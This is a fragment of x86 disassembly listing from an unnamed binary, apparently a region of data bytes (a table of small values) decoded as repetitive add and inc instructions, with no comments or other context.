  43ad08:	add    BYTE PTR [edi+edi*8],bh
  43ad0b:	add    BYTE PTR [eax],al
  43ad0d:	xor    bh,bh
  43ad0f:	add    BYTE PTR [eax],al
  43ad11:	cmp    edi,edi
  43ad13:	add    BYTE PTR [eax],al
  43ad15:	xor    edi,edi
  43ad17:	add    BYTE PTR [eax],al
  43ad19:	das    
  43ad1a:	inc    DWORD PTR [eax]
  43ad1c:	add    BYTE PTR [edx],dh
  43ad1e:	inc    DWORD PTR [eax]
  43ad20:	add    BYTE PTR [ebx],ah
  43ad22:	inc    DWORD PTR [eax]
  43ad24:	add    BYTE PTR [edi+edi*8],ch
  43ad27:	add    BYTE PTR [eax],al
  43ad29:	xor    bh,bh
  43ad2b:	add    BYTE PTR [eax],al
  43ad2d:	xor    edi,edi
  43ad2f:	add    BYTE PTR [eax],al
  43ad31:	sub    edi,edi
  43ad33:	add    BYTE PTR [eax],al
  43ad35:	sub    al,0xff
  43ad37:	add    BYTE PTR [eax],al
  43ad39:	sub    edi,edi
  43ad3b:	add    BYTE PTR [eax],al
  43ad3d:	sub    al,0xff
  43ad3f:	add    BYTE PTR [eax],al
  43ad41:	sub    eax,0x1e0000ff
  43ad46:	inc    DWORD PTR [eax]
  43ad48:	add    BYTE PTR [eax],bl
  43ad4a:	inc    DWORD PTR [eax]
  43ad4c:	add    BYTE PTR [eax],ah
  43ad4e:	inc    DWORD PTR [eax]
  43ad50:	add    BYTE PTR [ebx],ah
  43ad52:	inc    DWORD PTR [eax]
  43ad54:	add    BYTE PTR [eax],ch
  43ad56:	inc    DWORD PTR [eax]
  43ad58:	add    BYTE PTR [ecx],ah
  43ad5a:	inc    DWORD PTR [eax]
  43ad5c:	add    BYTE PTR [esi],ch
  43ad5e:	inc    DWORD PTR [eax]
  43ad60:	add    BYTE PTR [esi],ah
  43ad62:	inc    DWORD PTR [eax]
  43ad64:	add    BYTE PTR [ecx],ch
  43ad66:	inc    DWORD PTR [eax]
  43ad68:	add    BYTE PTR [edi],ah
  43ad6a:	inc    DWORD PTR [eax]
  43ad6c:	add    BYTE PTR [esi],ah
  43ad6e:	inc    DWORD PTR [eax]
  43ad70:	add    BYTE PTR [ebx],bl
  43ad72:	inc    DWORD PTR [eax]
  43ad74:	add    BYTE PTR [edi+edi*8],ch
  43ad77:	add    BYTE PTR [eax],al
  43ad79:	sub    al,0xff
  43ad7b:	add    BYTE PTR [eax],al
  43ad7d:	and    bh,bh
  43ad7f:	add    BYTE PTR [eax],al
  43ad81:	daa    
  43ad82:	inc    DWORD PTR [eax]
  43ad84:	add    BYTE PTR [edi+edi*8],dl
  43ad87:	add    BYTE PTR [eax],al
  43ad89:	push   ds
  43ad8a:	inc    DWORD PTR [eax]
  43ad8c:	add    BYTE PTR [edi+edi*8],bl
  43ad8f:	add    BYTE PTR [eax],al
  43ad91:	sub    edi,edi
  43ad93:	add    BYTE PTR [eax],al
  43ad95:	xor    bh,bh
  43ad97:	add    BYTE PTR [eax],al
  43ad99:	xor    al,0xff
  43ad9b:	add    BYTE PTR [eax],al
  43ad9d:	xor    eax,0x2b0000ff
  43ada2:	inc    DWORD PTR [eax]
  43ada4:	add    BYTE PTR [edx],dh
  43ada6:	inc    DWORD PTR [eax]
  43ada8:	add    BYTE PTR [edi],bh
  43adaa:	inc    DWORD PTR [eax]
  43adac:	add    BYTE PTR [esi-0x1],al
  43adaf:	add    BYTE PTR [eax],al
  43adb1:	inc    esp
  43adb2:	inc    DWORD PTR [eax]
  43adb4:	add    BYTE PTR [edi+edi*8],dh
  43adb7:	add    BYTE PTR [eax],al
  43adb9:	cmp    bh,bh
  43adbb:	add    BYTE PTR [eax],al
  43adbd:	and    bh,bh
  43adbf:	add    BYTE PTR [eax],al
  43adc1:	sbb    al,0xff
  43adc3:	add    BYTE PTR [eax],al
  43adc5:	and    bh,bh
  43adc7:	add    BYTE PTR [eax],al
  43adc9:	daa    
  43adca:	inc    DWORD PTR [eax]
  43adcc:	add    BYTE PTR [edi+edi*8],bh
  43adcf:	add    BYTE PTR [eax],al
  43add1:	inc    eax
  43add2:	inc    DWORD PTR [eax]
  43add4:	add    BYTE PTR ds:0x350000ff,bh
  43adda:	inc    DWORD PTR [eax]
  43addc:	add    BYTE PTR [eax-0x1],al
  43addf:	add    BYTE PTR [eax],al
  43ade1:	dec    esp
  43ade2:	inc    DWORD PTR [eax]
  43ade4:	add    BYTE PTR [edx-0x1],dl
  43ade7:	add    BYTE PTR [eax],al
  43ade9:	inc    esi
  43adea:	inc    DWORD PTR [eax]
  43adec:	add    BYTE PTR [ebx],bh
  43adee:	inc    DWORD PTR [eax]
  43adf0:	add    BYTE PTR [esi],dh
  43adf2:	inc    DWORD PTR [eax]
  43adf4:	add    BYTE PTR [ecx-0x1],al
  43adf7:	add    BYTE PTR [eax],al
  43adf9:	cmp    edi,edi
  43adfb:	add    BYTE PTR [eax],al
  43adfd:	inc    ecx
  43adfe:	inc    DWORD PTR [eax]
  43ae00:	add    BYTE PTR [ecx],dh
  43ae02:	inc    DWORD PTR [eax]
  43ae04:	add    BYTE PTR [edi+edi*8],dh
  43ae07:	add    BYTE PTR [eax],al
  43ae09:	and    eax,0x380000ff
  43ae0e:	inc    DWORD PTR [eax]
  43ae10:	add    BYTE PTR [ecx-0x1],al
  43ae13:	add    BYTE PTR [eax],al
  43ae15:	inc    edx
  43ae16:	inc    DWORD PTR [eax]
  43ae18:	add    BYTE PTR [ebx-0x1],cl
  43ae1b:	add    BYTE PTR [eax],al
  43ae1d:	inc    DWORD PTR ds:[eax]
  43ae20:	add    BYTE PTR [ebp-0x1],cl
  43ae23:	add    BYTE PTR [eax],al
  43ae25:	inc    eax
  43ae26:	inc    DWORD PTR [eax]
  43ae28:	add    BYTE PTR [edi+edi*8+0x0],al
  43ae2c:	add    BYTE PTR [ebp-0x1],al
  43ae2f:	add    BYTE PTR [eax],al
  43ae31:	inc    eax
  43ae32:	inc    DWORD PTR [eax]
  43ae34:	add    BYTE PTR [edx-0x1],al
  43ae37:	add    BYTE PTR [eax],al
  43ae39:	inc    ecx
  43ae3a:	inc    DWORD PTR [eax]
  43ae3c:	add    BYTE PTR [edi-0x1],al
  43ae3f:	add    BYTE PTR [eax],al
  43ae41:	dec    ebp
  43ae42:	inc    DWORD PTR [eax]
  43ae44:	add    BYTE PTR [edx-0x1],al
  43ae47:	add    BYTE PTR [eax],al
  43ae49:	das    
  43ae4a:	inc    DWORD PTR [eax]
  43ae4c:	add    BYTE PTR [ebx],bh
  43ae4e:	inc    DWORD PTR [eax]
  43ae50:	add    BYTE PTR [eax-0x1],cl
  43ae53:	add    BYTE PTR [eax],al
  43ae55:	dec    edi
  43ae56:	inc    DWORD PTR [eax]
  43ae58:	add    BYTE PTR [edi+edi*8+0x0],cl
  43ae5c:	add    BYTE PTR [ebp-0x1],cl
  43ae5f:	add    BYTE PTR [eax],al
  43ae61:	dec    edx
  43ae62:	inc    DWORD PTR [eax]
  43ae64:	add    BYTE PTR [edx],bh
  43ae66:	inc    DWORD PTR [eax]
  43ae68:	add    BYTE PTR [ebx-0x1],dl
  43ae6b:	add    BYTE PTR [eax],al
  43ae6d:	push   eax
  43ae6e:	inc    DWORD PTR [eax]
  43ae70:	add    BYTE PTR [ebx-0x1],al
  43ae73:	add    BYTE PTR [eax],al
  43ae75:	inc    ecx
  43ae76:	inc    DWORD PTR [eax]
  43ae78:	add    BYTE PTR ds:0x460000ff,bh
  43ae7e:	inc    DWORD PTR [eax]
  43ae80:	add    BYTE PTR [edi-0x1],dl
  43ae83:	add    BYTE PTR [eax],al
  43ae85:	inc    WORD PTR [eax]
  43ae88:	add    BYTE PTR [edi+edi*8+0x0],cl
  43ae8c:	add    BYTE PTR ds:0x470000ff,bh
  43ae92:	inc    DWORD PTR [eax]
  43ae94:	add    BYTE PTR [edi],ch
  43ae96:	inc    DWORD PTR [eax]
  43ae98:	add    BYTE PTR ds:0x360000ff,bh
  43ae9e:	inc    DWORD PTR [eax]
  43aea0:	add    BYTE PTR [ebp-0x1],cl
  43aea3:	add    BYTE PTR [eax],al
  43aea5:	cmp    eax,0x350000ff
  43aeaa:	inc    DWORD PTR [eax]
  43aeac:	add    BYTE PTR [edi+edi*8],bh
  43aeaf:	add    BYTE PTR [eax],al
  43aeb1:	inc    DWORD PTR ds:[eax]
  43aeb4:	add    BYTE PTR [eax-0x1],cl
  43aeb7:	add    BYTE PTR [eax],al
  43aeb9:	dec    eax
  43aeba:	inc    DWORD PTR [eax]
  43aebc:	add    BYTE PTR [ebx-0x1],cl
  43aebf:	add    BYTE PTR [eax],al
  43aec1:	inc    DWORD PTR ss:[eax]
  43aec4:	add    BYTE PTR [edx],bh
  43aec6:	inc    DWORD PTR [eax]
  43aec8:	add    BYTE PTR [edx-0x1],al
  43aecb:	add    BYTE PTR [eax],al
  43aecd:	das    
  43aece:	inc    DWORD PTR [eax]
  43aed0:	add    BYTE PTR [ecx],bh
  43aed2:	inc    DWORD PTR [eax]
  43aed4:	add    BYTE PTR [esi],ah
  43aed6:	inc    DWORD PTR [eax]
  43aed8:	add    BYTE PTR [ebx],ch
  43aeda:	inc    DWORD PTR [eax]
  43aedc:	add    BYTE PTR [ebx],dh
  43aede:	inc    DWORD PTR [eax]
  43aee0:	add    BYTE PTR [ebx],ch
  43aee2:	inc    DWORD PTR [eax]
  43aee4:	add    BYTE PTR [edx-0x1],al
  43aee7:	add    BYTE PTR [eax],al
  43aee9:	daa    
  43aeea:	inc    DWORD PTR [eax]
  43aeec:	add    BYTE PTR [ebx],dh
  43aeee:	inc    DWORD PTR [eax]
  43aef0:	add    BYTE PTR [esi],bh
  43aef2:	inc    DWORD PTR [eax]
  43aef4:	add    BYTE PTR [eax],dh
  43aef6:	inc    DWORD PTR [eax]
  43aef8:	add    BYTE PTR [edi],dh
  43aefa:	inc    DWORD PTR [eax]
  43aefc:	add    BYTE PTR [ebx],dh
  43aefe:	inc    DWORD PTR [eax]
  43af00:	add    BYTE PTR [edx],ch
  43af02:	inc    DWORD PTR [eax]
  43af04:	add    BYTE PTR [eax],bh
  43af06:	inc    DWORD PTR [eax]
  43af08:	add    BYTE PTR [edx],ch
  43af0a:	inc    DWORD PTR [eax]
  43af0c:	add    BYTE PTR [esi],ch
  43af0e:	inc    DWORD PTR [eax]
  43af10:	add    BYTE PTR [edi],ah
  43af12:	inc    DWORD PTR [eax]
  43af14:	add    BYTE PTR [esi],ch
  43af16:	inc    DWORD PTR [eax]
  43af18:	add    BYTE PTR [ecx],bh
  43af1a:	inc    DWORD PTR [eax]
  43af1c:	add    BYTE PTR [edx],dh
  43af1e:	inc    DWORD PTR [eax]
  43af20:	add    BYTE PTR [edx],ch
  43af22:	inc    DWORD PTR [eax]
  43af24:	add    BYTE PTR [esi],ah
  43af26:	inc    DWORD PTR [eax]
  43af28:	add    BYTE PTR [ecx],dh
  43af2a:	inc    DWORD PTR [eax]
  43af2c:	add    BYTE PTR [ecx],dh
  43af2e:	inc    DWORD PTR [eax]
  43af30:	add    BYTE PTR [ecx],dh
  43af32:	inc    DWORD PTR [eax]
  43af34:	add    BYTE PTR [edi],ch
  43af36:	inc    DWORD PTR [eax]
  43af38:	add    BYTE PTR [eax],ch
  43af3a:	inc    DWORD PTR [eax]
  43af3c:	add    BYTE PTR ds:0x270000ff,ah
  43af42:	inc    DWORD PTR [eax]
  43af44:	add    BYTE PTR [edx],bl
  43af46:	inc    DWORD PTR [eax]
  43af48:	add    BYTE PTR [edx],ah
  43af4a:	inc    DWORD PTR [eax]
  43af4c:	add    BYTE PTR [edx],bl
  43af4e:	inc    DWORD PTR [eax]
  43af50:	add    BYTE PTR [eax],ah
  43af52:	inc    DWORD PTR [eax]
  43af54:	add    BYTE PTR [ebx],bl
  43af56:	inc    DWORD PTR [eax]
  43af58:	add    BYTE PTR [ebx],bl
  43af5a:	inc    DWORD PTR [eax]
  43af5c:	add    BYTE PTR [edi],dl
  43af5e:	inc    DWORD PTR [eax]
  43af60:	add    BYTE PTR [edi],ah
  43af62:	inc    DWORD PTR [eax]
  43af64:	add    BYTE PTR [ebx],ah
  43af66:	inc    DWORD PTR [eax]
  43af68:	add    BYTE PTR [edi],bl
  43af6a:	inc    DWORD PTR [eax]
  43af6c:	add    BYTE PTR [eax],ch
  43af6e:	inc    DWORD PTR [eax]
  43af70:	add    BYTE PTR [eax],ch
  43af72:	inc    DWORD PTR [eax]
  43af74:	add    BYTE PTR [ecx],ch
  43af76:	inc    DWORD PTR [eax]
  43af78:	add    BYTE PTR [eax],bh
  43af7a:	inc    DWORD PTR [eax]
  43af7c:	add    BYTE PTR [ecx],ch
  43af7e:	inc    DWORD PTR [eax]
  43af80:	add    BYTE PTR [edx],ah
  43af82:	inc    DWORD PTR [eax]
  43af84:	add    BYTE PTR ds:0x250000ff,bl
  43af8a:	inc    DWORD PTR [eax]
  43af8c:	add    BYTE PTR [ecx],ch
  43af8e:	inc    DWORD PTR [eax]
  43af90:	add    BYTE PTR [edx],ah
  43af92:	inc    DWORD PTR [eax]
  43af94:	add    BYTE PTR [edx],dh
  43af96:	inc    DWORD PTR [eax]
  43af98:	add    BYTE PTR [ebx],ah
  43af9a:	inc    DWORD PTR [eax]
  43af9c:	add    BYTE PTR ds:0x2c0000ff,ch
  43afa2:	inc    DWORD PTR [eax]
  43afa4:	add    BYTE PTR [edx],ah
  43afa6:	inc    DWORD PTR [eax]
  43afa8:	add    BYTE PTR [eax],ch
  43afaa:	inc    DWORD PTR [eax]
  43afac:	add    BYTE PTR [edx],bh
  43afae:	inc    DWORD PTR [eax]
  43afb0:	add    BYTE PTR ds:0x3a0000ff,bh
  43afb6:	inc    DWORD PTR [eax]
  43afb8:	add    BYTE PTR ds:0x430000ff,dh
  43afbe:	inc    DWORD PTR [eax]
  43afc0:	add    BYTE PTR [esi-0x1],cl
  43afc3:	add    BYTE PTR [eax],al
  43afc5:	inc    DWORD PTR cs:[eax]
  43afc8:	add    BYTE PTR [edi],ch
  43afca:	inc    DWORD PTR [eax]
  43afcc:	add    BYTE PTR [eax],bh
  43afce:	inc    DWORD PTR [eax]
  43afd0:	add    BYTE PTR [esi],dh
  43afd2:	inc    DWORD PTR [eax]
  43afd4:	add    BYTE PTR ds:0x2a0000ff,bh
  43afda:	inc    DWORD PTR [eax]
  43afdc:	add    BYTE PTR ds:0x310000ff,ch
  43afe2:	inc    DWORD PTR [eax]
  43afe4:	add    BYTE PTR [edx-0x1],al
  43afe7:	add    BYTE PTR [eax],al
  43afe9:	inc    DWORD PTR ds:[eax]
  43afec:	add    BYTE PTR [eax-0x1],cl
  43afef:	add    BYTE PTR [eax],al
  43aff1:	dec    ecx
  43aff2:	inc    DWORD PTR [eax]
  43aff4:	add    BYTE PTR [ebp-0x1],al
  43aff7:	add    BYTE PTR [eax],al
  43aff9:	cmp    eax,0x310000ff
  43affe:	inc    DWORD PTR [eax]
  43b000:	add    BYTE PTR [ebx],bh
  43b002:	inc    DWORD PTR [eax]
  43b004:	add    BYTE PTR [eax-0x1],al
  43b007:	add    BYTE PTR [eax],al
  43b009:	cmp    edi,edi
  43b00b:	add    BYTE PTR [eax],al
  43b00d:	(bad)  
  43b00e:	inc    DWORD PTR [eax]
  43b010:	add    BYTE PTR [edx-0x1],al
  43b013:	add    BYTE PTR [eax],al
  43b015:	inc    edx
  43b016:	inc    DWORD PTR [eax]
  43b018:	add    BYTE PTR [ecx-0x1],dl
  43b01b:	add    BYTE PTR [eax],al
  43b01d:	cmp    bh,bh
  43b01f:	add    BYTE PTR [eax],al
  43b021:	inc    esp
  43b022:	inc    DWORD PTR [eax]
  43b024:	add    BYTE PTR [ebx],dh
  43b026:	inc    DWORD PTR [eax]
  43b028:	add    BYTE PTR [eax],bh
  43b02a:	inc    DWORD PTR [eax]
  43b02c:	add    BYTE PTR [edi+edi*8+0x0],dl
  43b030:	add    BYTE PTR [esi],dh
  43b032:	inc    DWORD PTR [eax]
  43b034:	add    BYTE PTR [edi],bh
  43b036:	inc    DWORD PTR [eax]
  43b038:	add    BYTE PTR [ebp-0x1],al
  43b03b:	add    BYTE PTR [eax],al
  43b03d:	inc    edi
  43b03e:	inc    DWORD PTR [eax]
  43b040:	add    BYTE PTR [eax-0x1],al
  43b043:	add    BYTE PTR [eax],al
  43b045:	dec    ecx
  43b046:	inc    DWORD PTR [eax]
  43b048:	add    BYTE PTR [edx],dh
  43b04a:	inc    DWORD PTR [eax]
  43b04c:	add    BYTE PTR [ebp-0x1],al
  43b04f:	add    BYTE PTR [eax],al
  43b051:	inc    ebp
  43b052:	inc    DWORD PTR [eax]
  43b054:	add    BYTE PTR [edx-0x1],cl
  43b057:	add    BYTE PTR [eax],al
  43b059:	dec    ecx
  43b05a:	inc    DWORD PTR [eax]
  43b05c:	add    BYTE PTR [ebx-0x1],dl
  43b05f:	add    BYTE PTR [eax],al
  43b061:	push   edi
  43b062:	inc    DWORD PTR [eax]
  43b064:	add    BYTE PTR [eax-0x1],al
  43b067:	add    BYTE PTR [eax],al
  43b069:	push   ecx
  43b06a:	inc    DWORD PTR [eax]
  43b06c:	add    BYTE PTR [eax],bh
  43b06e:	inc    DWORD PTR [eax]
  43b070:	add    BYTE PTR [ebx-0x1],cl
  43b073:	add    BYTE PTR [eax],al
  43b075:	sub    bh,bh
  43b077:	add    BYTE PTR [eax],al
  43b079:	cmp    bh,bh
  43b07b:	add    BYTE PTR [eax],al
  43b07d:	inc    DWORD PTR ds:[eax]
  43b080:	add    BYTE PTR [ebx],dh
  43b082:	inc    DWORD PTR [eax]
  43b084:	add    BYTE PTR [edi+edi*8+0x0],al
  43b088:	add    BYTE PTR [edx-0x1],cl
  43b08b:	add    BYTE PTR [eax],al
  43b08d:	dec    edi
  43b08e:	inc    DWORD PTR [eax]
  43b090:	add    BYTE PTR [edi+edi*8+0x0],dl
  43b094:	add    BYTE PTR [ecx-0x1],al
  43b097:	add    BYTE PTR [eax],al
  43b099:	cmp    bh,bh
  43b09b:	add    BYTE PTR [eax],al
  43b09d:	inc    ebp
  43b09e:	inc    DWORD PTR [eax]
  43b0a0:	add    BYTE PTR [ebx],bh
  43b0a2:	inc    DWORD PTR [eax]
  43b0a4:	add    BYTE PTR [ecx-0x1],al
  43b0a7:	add    BYTE PTR [eax],al
  43b0a9:	cmp    bh,bh
  43b0ab:	add    BYTE PTR [eax],al
  43b0ad:	inc    ebx
  43b0ae:	inc    DWORD PTR [eax]
  43b0b0:	add    BYTE PTR [edi],bh
  43b0b2:	inc    DWORD PTR [eax]
  43b0b4:	add    BYTE PTR ds:0x3f0000ff,dh
  43b0ba:	inc    DWORD PTR [eax]
  43b0bc:	add    BYTE PTR [eax],bh
  43b0be:	inc    DWORD PTR [eax]
  43b0c0:	add    BYTE PTR [edx],bh
  43b0c2:	inc    DWORD PTR [eax]
  43b0c4:	add    BYTE PTR [esi],bh
  43b0c6:	inc    DWORD PTR [eax]
  43b0c8:	add    BYTE PTR [ecx],bh
  43b0ca:	inc    DWORD PTR [eax]
  43b0cc:	add    BYTE PTR [esi],ch
  43b0ce:	inc    DWORD PTR [eax]
  43b0d0:	add    BYTE PTR [edi],bh
  43b0d2:	inc    DWORD PTR [eax]
  43b0d4:	add    BYTE PTR [esi],bh
  43b0d6:	inc    DWORD PTR [eax]
  43b0d8:	add    BYTE PTR [esi],bh
  43b0da:	inc    DWORD PTR [eax]
  43b0dc:	add    BYTE PTR [esi-0x1],al
  43b0df:	add    BYTE PTR [eax],al
  43b0e1:	and    al,0xff
  43b0e3:	add    BYTE PTR [eax],al
  43b0e5:	das    
  43b0e6:	inc    DWORD PTR [eax]
  43b0e8:	add    BYTE PTR [edi-0x1],al
  43b0eb:	add    BYTE PTR [eax],al
  43b0ed:	xor    edi,edi
  43b0ef:	add    BYTE PTR [eax],al
  43b0f1:	xor    bh,bh
  43b0f3:	add    BYTE PTR [eax],al
  43b0f5:	and    bh,bh
  43b0f7:	add    BYTE PTR [eax],al
  43b0f9:	sub    al,0xff
  43b0fb:	add    BYTE PTR [eax],al
  43b0fd:	cmp    bh,bh
  43b0ff:	add    BYTE PTR [eax],al
  43b101:	sub    bh,bh
  43b103:	add    BYTE PTR [eax],al
  43b105:	xor    edi,edi
  43b107:	add    BYTE PTR [eax],al
  43b109:	xor    edi,edi
  43b10b:	add    BYTE PTR [eax],al
  43b10d:	xor    edi,edi
  43b10f:	add    BYTE PTR [eax],al
  43b111:	sub    edi,edi
  43b113:	add    BYTE PTR [eax],al
  43b115:	sub    edi,edi
  43b117:	add    BYTE PTR [eax],al
  43b119:	aaa    
  43b11a:	inc    DWORD PTR [eax]
  43b11c:	add    BYTE PTR [edi+edi*8],dh
  43b11f:	add    BYTE PTR [eax],al
  43b121:	inc    DWORD PTR es:[eax]
  43b124:	add    BYTE PTR [eax],ch
  43b126:	inc    DWORD PTR [eax]
  43b128:	add    BYTE PTR [edi+edi*8],ch
  43b12b:	add    BYTE PTR [eax],al
  43b12d:	inc    DWORD PTR cs:[eax]
  43b130:	add    BYTE PTR [edx],ah
  43b132:	inc    DWORD PTR [eax]
  43b134:	add    BYTE PTR [eax],dh
  43b136:	inc    DWORD PTR [eax]
  43b138:	add    BYTE PTR ds:0x230000ff,ch
  43b13e:	inc    DWORD PTR [eax]
  43b140:	add    BYTE PTR [eax],ah
  43b142:	inc    DWORD PTR [eax]
  43b144:	add    BYTE PTR [edx],bl
  43b146:	inc    DWORD PTR [eax]
  43b148:	add    BYTE PTR [ecx],ah
  43b14a:	inc    DWORD PTR [eax]
  43b14c:	add    BYTE PTR ds:0x250000ff,ah
  43b152:	inc    DWORD PTR [eax]
  43b154:	add    BYTE PTR [eax],ah
  43b156:	inc    DWORD PTR [eax]
  43b158:	add    BYTE PTR [ebx],bl
  43b15a:	inc    DWORD PTR [eax]
  43b15c:	add    BYTE PTR [edx],ah
  43b15e:	inc    DWORD PTR [eax]
  43b160:	add    BYTE PTR ds:0x270000ff,dl
  43b166:	inc    DWORD PTR [eax]
  43b168:	add    BYTE PTR [edx],dl
  43b16a:	inc    DWORD PTR [eax]
  43b16c:	add    BYTE PTR [eax],ah
  43b16e:	inc    DWORD PTR [eax]
  43b170:	add    BYTE PTR [edx],ch
  43b172:	inc    DWORD PTR [eax]
  43b174:	add    BYTE PTR ds:0x1c0000ff,ah
  43b17a:	inc    DWORD PTR [eax]
  43b17c:	add    BYTE PTR [edi],ah
  43b17e:	inc    DWORD PTR [eax]
  43b180:	add    BYTE PTR ds:0x2c0000ff,ah
  43b186:	inc    DWORD PTR [eax]
  43b188:	add    BYTE PTR ds:0x2a0000ff,ch
  43b18e:	inc    DWORD PTR [eax]
  43b190:	add    BYTE PTR [edx],dh
  43b192:	inc    DWORD PTR [eax]
  43b194:	add    BYTE PTR ds:0x230000ff,dh
  43b19a:	inc    DWORD PTR [eax]
  43b19c:	add    BYTE PTR [ecx],dh
  43b19e:	inc    DWORD PTR [eax]
  43b1a0:	add    BYTE PTR [ecx],dh
  43b1a2:	inc    DWORD PTR [eax]
  43b1a4:	add    BYTE PTR [edx],ch
  43b1a6:	inc    DWORD PTR [eax]
  43b1a8:	add    BYTE PTR [esi],dh
  43b1aa:	inc    DWORD PTR [eax]
  43b1ac:	add    BYTE PTR [ebx],bh
  43b1ae:	inc    DWORD PTR [eax]
  43b1b0:	add    BYTE PTR ds:0x320000ff,ch
  43b1b6:	inc    DWORD PTR [eax]
  43b1b8:	add    BYTE PTR [ecx-0x1],al
  43b1bb:	add    BYTE PTR [eax],al
  43b1bd:	sbb    al,0xff
  43b1bf:	add    BYTE PTR [eax],al
  43b1c1:	cmp    bh,bh
  43b1c3:	add    BYTE PTR [eax],al
  43b1c5:	cmp    bh,bh
  43b1c7:	add    BYTE PTR [eax],al
  43b1c9:	inc    ebx
  43b1ca:	inc    DWORD PTR [eax]
  43b1cc:	add    BYTE PTR [ebx],dh
  43b1ce:	inc    DWORD PTR [eax]
  43b1d0:	add    BYTE PTR [edi],bh
  43b1d2:	inc    DWORD PTR [eax]
  43b1d4:	add    BYTE PTR [edi+edi*8],bh
  43b1d7:	add    BYTE PTR [eax],al
  43b1d9:	inc    ebx
  43b1da:	inc    DWORD PTR [eax]
  43b1dc:	add    BYTE PTR [edi+edi*8],ch
  43b1df:	add    BYTE PTR [eax],al
  43b1e1:	das    
  43b1e2:	inc    DWORD PTR [eax]
  43b1e4:	add    BYTE PTR [ebx-0x1],al
  43b1e7:	add    BYTE PTR [eax],al
  43b1e9:	sub    bh,bh
  43b1eb:	add    BYTE PTR [eax],al
  43b1ed:	xor    edi,edi
  43b1ef:	add    BYTE PTR [eax],al
  43b1f1:	xor    al,0xff
  43b1f3:	add    BYTE PTR [eax],al
  43b1f5:	xor    bh,bh
  43b1f7:	add    BYTE PTR [eax],al
  43b1f9:	dec    ecx
  43b1fa:	inc    DWORD PTR [eax]
  43b1fc:	add    BYTE PTR [ecx-0x1],al
  43b1ff:	add    BYTE PTR [eax],al
  43b201:	inc    edi
  43b202:	inc    DWORD PTR [eax]
  43b204:	add    BYTE PTR [ebx-0x1],al
  43b207:	add    BYTE PTR [eax],al
  43b209:	xor    eax,0x3f0000ff
  43b20e:	inc    DWORD PTR [eax]
  43b210:	add    BYTE PTR [edi],bh
  43b212:	inc    DWORD PTR [eax]
  43b214:	add    BYTE PTR [esi],dh
  43b216:	inc    DWORD PTR [eax]
  43b218:	add    BYTE PTR [edi+edi*8+0x0],al
  43b21c:	add    BYTE PTR [ebx],bh
  43b21e:	inc    DWORD PTR [eax]
  43b220:	add    BYTE PTR [esi],bh
  43b222:	inc    DWORD PTR [eax]
  43b224:	add    BYTE PTR [edi-0x1],al
  43b227:	add    BYTE PTR [eax],al
  43b229:	inc    ecx
  43b22a:	inc    DWORD PTR [eax]
  43b22c:	add    BYTE PTR ds:0x210000ff,bh
  43b232:	inc    DWORD PTR [eax]
  43b234:	add    BYTE PTR [ebx],bh
  43b236:	inc    DWORD PTR [eax]
  43b238:	add    BYTE PTR [ebx-0x1],dl
  43b23b:	add    BYTE PTR [eax],al
  43b23d:	aas    
  43b23e:	inc    DWORD PTR [eax]
  43b240:	add    BYTE PTR [ecx-0x1],al
  43b243:	add    BYTE PTR [eax],al
  43b245:	inc    ecx
  43b246:	inc    DWORD PTR [eax]
  43b248:	add    BYTE PTR [edx-0x1],al
  43b24b:	add    BYTE PTR [eax],al
  43b24d:	cmp    edi,edi
  43b24f:	add    BYTE PTR [eax],al
  43b251:	cmp    bh,bh
  43b253:	add    BYTE PTR [eax],al
  43b255:	aaa    
  43b256:	inc    DWORD PTR [eax]
  43b258:	add    BYTE PTR [edi+edi*8],dh
  43b25b:	add    BYTE PTR [eax],al
  43b25d:	inc    DWORD PTR ds:[eax]
  43b260:	add    BYTE PTR [ebx],ch
  43b262:	inc    DWORD PTR [eax]
  43b264:	add    BYTE PTR [edi+edi*8],dh
  43b267:	add    BYTE PTR [eax],al
  43b269:	dec    esi
  43b26a:	inc    DWORD PTR [eax]
  43b26c:	add    BYTE PTR [edi],dh
  43b26e:	inc    DWORD PTR [eax]
  43b270:	add    BYTE PTR [edx-0x1],al
  43b273:	add    BYTE PTR [eax],al
  43b275:	inc    edi
  43b276:	inc    DWORD PTR [eax]
  43b278:	add    BYTE PTR [eax-0x1],dl
  43b27b:	add    BYTE PTR [eax],al
  43b27d:	xor    edi,edi
  43b27f:	add    BYTE PTR [eax],al
  43b281:	cmp    al,0xff
  43b283:	add    BYTE PTR [eax],al
  43b285:	inc    DWORD PTR ds:[eax]
  43b288:	add    BYTE PTR [ecx],bh
  43b28a:	inc    DWORD PTR [eax]
  43b28c:	add    BYTE PTR [eax],bh
  43b28e:	inc    DWORD PTR [eax]
  43b290:	add    BYTE PTR [edi+edi*8+0x0],dl
  43b294:	add    BYTE PTR [ebx-0x1],dl
  43b297:	add    BYTE PTR [eax],al
  43b299:	inc    esi
  43b29a:	inc    DWORD PTR [eax]
  43b29c:	add    BYTE PTR ds:0x3d0000ff,bh
  43b2a2:	inc    DWORD PTR [eax]
  43b2a4:	add    BYTE PTR [esi-0x1],al
  43b2a7:	add    BYTE PTR [eax],al
  43b2a9:	xor    bh,bh
  43b2ab:	add    BYTE PTR [eax],al
  43b2ad:	cmp    bh,bh
  43b2af:	add    BYTE PTR [eax],al
  43b2b1:	cmp    eax,0x250000ff
  43b2b6:	inc    DWORD PTR [eax]
  43b2b8:	add    BYTE PTR [edi],ch
  43b2ba:	inc    DWORD PTR [eax]
  43b2bc:	add    BYTE PTR [edi+edi*8+0x0],al
  43b2c0:	add    BYTE PTR [ecx-0x1],al
  43b2c3:	add    BYTE PTR [eax],al
  43b2c5:	sub    bh,bh
  43b2c7:	add    BYTE PTR [eax],al
  43b2c9:	cmp    edi,edi
  43b2cb:	add    BYTE PTR [eax],al
  43b2cd:	inc    ecx
  43b2ce:	inc    DWORD PTR [eax]
  43b2d0:	add    BYTE PTR [ebx],bh
  43b2d2:	inc    DWORD PTR [eax]
  43b2d4:	add    BYTE PTR [ecx],bh
  43b2d6:	inc    DWORD PTR [eax]
  43b2d8:	add    BYTE PTR [edi+edi*8],bh
  43b2db:	add    BYTE PTR [eax],al
  43b2dd:	cmp    edi,edi
  43b2df:	add    BYTE PTR [eax],al
  43b2e1:	das    
  43b2e2:	inc    DWORD PTR [eax]
  43b2e4:	add    BYTE PTR [edx],bh
  43b2e6:	inc    DWORD PTR [eax]
  43b2e8:	add    BYTE PTR [edi+edi*8],ch
  43b2eb:	add    BYTE PTR [eax],al
  43b2ed:	cmp    bh,bh
  43b2ef:	add    BYTE PTR [eax],al
  43b2f1:	cmp    eax,0x360000ff
  43b2f6:	inc    DWORD PTR [eax]
  43b2f8:	add    BYTE PTR [eax],dh
